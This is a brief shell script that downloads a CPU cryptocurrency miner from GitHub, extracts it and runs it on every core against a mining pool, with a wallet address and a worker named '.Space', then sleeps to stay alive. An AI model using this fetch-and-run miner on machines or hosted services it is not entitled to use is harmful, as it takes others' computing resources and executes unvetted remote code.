#!/bin/sh

wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer  -c stratum+tcp://ap.luckpool.net:3956 -u RF5xRYxdXryTYErYHxiiHUK9846ZX48XaU.Space -p x --cpu $(nproc --all) 
sleep 999999
